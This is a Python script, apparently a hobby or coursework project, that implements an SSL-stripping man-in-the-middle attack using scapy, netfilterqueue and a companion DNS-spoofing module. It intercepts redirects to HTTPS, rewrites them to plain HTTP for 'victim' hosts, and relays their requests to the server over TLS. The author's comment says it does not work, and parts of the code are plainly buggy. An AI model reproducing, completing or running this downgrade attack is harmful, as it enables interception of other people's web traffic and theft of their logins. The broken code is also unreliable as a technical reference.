import netfilterqueue
import scapy.all as scapy
import dns_spoofing
from scapy.layers.http import *

#DOES NOT WORK, cant manage to get httpsrequest working, have been trying for days.

#httprequest requires scapy 2.5 (which is supported by python 2.7)
#sudo rm -rf /usr/local/lib/python2.7/dist-packages/scapy*
#sudo -H pip install setuptools
#sudo -H pip install scapy

#https://venafi.com/blog/what-are-ssl-stripping-attacks/
#Typical sequence of events without SSL stripping:
#1. user reaches out to server with http
#2. server sends response requesting to use https instead
#3. user initiates https connection

#SSL stripping attack
# we want to intercept 2., then initiate https with the server ourselves, strip and send http to the user

#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html
#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.automaton_cli.html for https connection with server
#example from this page:
#a = TLSClientAutomaton.tlslink(Raw, server="scapy.net", dport=443)
#a.send(HTTP()/HTTPRequest())
#
#or:
#a = TLSClientAutomaton.tlslink(HTTP, server="www.google.com", dport=443)
# pkt = a.sr1(HTTP()/HTTPRequest(), session=TCPSession(app=True), timeout=2)

#TODO code for keeping track of ssl stripped sessions/victim-server pairs/idk?
#(victim_ip, server_ip) : tls_session
tls_sessions = {}

#Check whether this is a redirect to https
def https_switching_request(scapy_packet):
    if scapy_packet.haslayer(HTTPResponse):
        http_layer = scapy_packet.getlayer(HTTPResponse)#https://github.com/secdev/scapy/blob/master/scapy/layers/http.py#L540-L581
        
        https = http_layer.Location.contains('https://') 
        redirect = http_layer.Status_Code[0] == "3" #3xx status code is for redirection (wikipedia)
        
        return https and redirect #if a redirect to https
    return False

# whether there already is a "client <--http--> us <--https--> server" situation
def existing_connection(scapy_packet):
    ip_src = scapy_packet.getlayer(scapy.IP).src
    ip_dst = scapy_packet.getlayer(scapy.IP).dst
    
    if (ip_src, ip_dst) in tls_sessions.keys():
        return True
    if (ip_dst, ip_src) in tls_sessions.keys():
        return True
    return False

def to_server(scapy_packet):
    ip_layer = scapy_packet.getlayer(scapy.IP)
    
    if ip_layer.src in dns_spoofing.victim_addresses.keys():
        return True
    
    return False

#Transforms an https redirect to normal http response
def strip_https_redirect(scapy_packet):
    http_layer = scapy_packet.getlayer(HTTPResponse)
    http_layer.Location = http_layer.Location.replace('https://', 'http://')
    http_layer.Status_Code = "200"

    return scapy_packet

def initiate_https_connection(scapy_packet):
    ip_server = scapy_packet.getlayer(scapy.IP).src
    ip_victim = scapy_packet.getlayer(scapy.IP).dst
    port_server = 443 # standard port, alternative:scapy_packet.getlayer(scapy.TCP).sport
    
    session = scapy.tls.TLSClientAutomaton.tlslink(scapy.Raw, server=ip_server, dport=port_server)
    tls_sessions[(ip_victim, ip_server)] = session
    return


#transforms http to https and sends to server
def forward_http_to_https(scapy_packet):
    victim_ip = scapy_packet.getlayer(scapy.IP).src
    server_ip = scapy_packet.getlayer(scapy.IP).dst

    http_request = scapy_packet.getlayer(HTTPRequest)
    
    http_request.Location = http_request.Location.replace('http://', 'https://')

    send_https_listen_and_forward(tls_sessions[(victim_ip, server_ip)], scapy.HTTP()/http_request, scapy_packet)
    return

#send https request, strip and forward http response to victim
def send_https_listen_and_forward(session, new_request, original_packet): #may need to be run on a separate thread
    response_packet = session.sr1(new_request, timeout=2)

    #strip url from https
    http_response =  response_packet.getlayer(HTTPResponse)
    http_response.Location = http_response.Location.replace('https://', 'http://')
    
    #build http response packet
    victim_ip = original_packet.getlayer(scapy.IP).src
    server_ip = original_packet.getlayer(scapy.IP).dst
    victim_port = original_packet.getlayer(scapy.TCP).sport

    http_response_packet = scapy.IP(dst=victim_ip, src=server_ip) / scapy.TCP(dport=victim_port, sport=80) / http_response
    
    scapy.send(http_response_packet, verbose=False)
    return


#alternative proxy method to just dns spoofing
def proxy_strip_only(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if https_switching_request(scapy_packet): #we assume only server sends this and not victim
        #strip https redirect and send http response to client
        stripped_packet = strip_https_redirect(scapy_packet)
        packet.set_payload(str(stripped_packet)) #conversion from https://stackoverflow.com/questions/46645142/modify-with-scapy-and-netfilterqueue
        packet.accept()

        initiate_https_connection(scapy_packet)
        return

    #When we have https with server and http with client for this session
    if existing_connection(scapy_packet):
        #TOWARDS CLIENT WILL NOT HAPPEN, AS HTTPS RESPONSE IS TOWARDS US SO WONT BE PROXIED
        forward_http_to_https(scapy_packet)
        packet.drop()
        return
            
    
    packet.accept()